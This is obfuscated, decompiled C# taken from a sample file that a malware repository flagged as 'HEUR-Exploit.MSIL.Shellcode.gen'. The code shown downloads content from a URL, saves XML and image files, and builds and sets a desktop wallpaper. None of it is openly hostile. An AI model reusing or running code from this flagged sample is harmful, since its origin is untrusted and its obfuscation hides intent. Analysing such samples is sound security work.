// Decompiled with JetBrains decompiler
// Type: 903211523809.Core.647778140714
// Assembly: 903211523809, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 9299602E-5CAC-472E-8784-954A0E70F0DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-930e3513275891a4d2d1e51b0fb588f4b7f0b665bd972c7e0ccfececc5c3933e.exe

using \u003500852630662;
using \u003543959430850;
using \u003903211523809.Core;
using \u003903211523809.Models;
using \u003903211523809.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;

namespace \u003903211523809.Core
{
  public static class \u003647778140714
  {
    private static void \u003552151037642(
      string _param0,
      string _param1,
      Func<string, \u003887690503632> _param2)
    {
      TimeSpan timeSpan = TimeSpan.FromMinutes(5.0);
      \u003367305612860 obj1 = new \u003367305612860();
      obj1.\u003946201174549 = timeSpan;
      obj1.Encoding = Encoding.UTF8;
      string contents;
      using (\u003367305612860 obj2 = obj1)
      {
        Console.WriteLine("Downloading " + _param0);
        contents = obj2.DownloadString(_param0);
      }
      \u003887690503632 obj3 = _param2(contents);
      string str1 = \u003647778140714.\u003132571955169(obj3);
      string path1 = Path.Combine(_param1, str1 ?? "");
      string str2 = ((IEnumerable<string>) str1.Split('_')).First<string>();
      string path2 = Path.Combine(_param1, str2 + ".xml");
      if (File.Exists(path2) && File.Exists(path1))
      {
        Console.WriteLine("Already have it: " + str2);
      }
      else
      {
        File.WriteAllText(path2, contents);
        try
        {
          \u003564914878355.\u003824560203357(obj3.\u003707791948621, path1);
        }
        catch (Exception ex)
        {
          ex.\u003602950046893();
          File.Delete(path1);
        }
      }
    }

    private static string \u003132571955169(\u003887690503632 _param0)
    {
      string str = Path.GetFileName(_param0.\u003707791948621).\u003831047137939();
      if (str.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase))
        return str;
      Uri uri = new Uri(_param0.\u003707791948621);
      return string.Empty;
    }

    public static void \u003438714912154()
    {
      string path1 = \u003084399638497.\u003930816790268();
      \u003375710858065 obj1 = \u003523302036718.\u003748437836198(path1);
      string str = obj1?.\u003795814332366;
      if (string.IsNullOrWhiteSpace(str) || !File.Exists(str))
      {
        Console.WriteLine(str + " not found.");
      }
      else
      {
        \u003202151177265 obj2 = new \u003202151177265(str);
        ((\u003294292093323) obj2).\u003083334157736 = \u003523302036718.\u003444442313774();
        ((\u003294292093323) obj2).\u003659859173533 = obj1.\u003481786698295;
        ((\u003294292093323) obj2).\u003698332164509 = Color.DarkRed;
        ((\u003294292093323) obj2).\u003731249217037 = \u003615024831903.\u003443057966566;
        ((\u003294292093323) obj2).\u003532464691381 = \u003615024831903.\u003028142547350;
        ((\u003294292093323) obj2).\u003069328377734 = \u003615024831903.\u003527798093966;
        ((\u003294292093323) obj2).\u003035875791855 = \u003615024831903.\u003511294617101;
        ((\u003294292093323) obj2).\u003259416888129 = \u003615024831903.\u003755014089608;
        ((\u003294292093323) obj2).\u003186663094112 = \u003615024831903.\u003995072800554;
        ((\u003294292093323) obj2).\u003077886729885 = \u003615024831903.\u003923108192432;
        using (\u003294292093323 obj3 = (\u003294292093323) obj2)
        {
          using (Image image = obj3.\u003116978438842())
          {
            string filename;
            if (\u003972226251564.get_IsWindows8Plus())
            {
              filename = Path.Combine(path1, "_wallpaper.png");
              image.Save(filename, ImageFormat.Png);
            }
            else
            {
              filename = Path.Combine(path1, "_wallpaper.bmp");
              image.Save(filename, ImageFormat.Bmp);
            }
            \u003136314963555.\u003991841991870(filename);
            \u003136314963555.\u003246775933998(filename);
          }
        }
      }
    }
  }
}
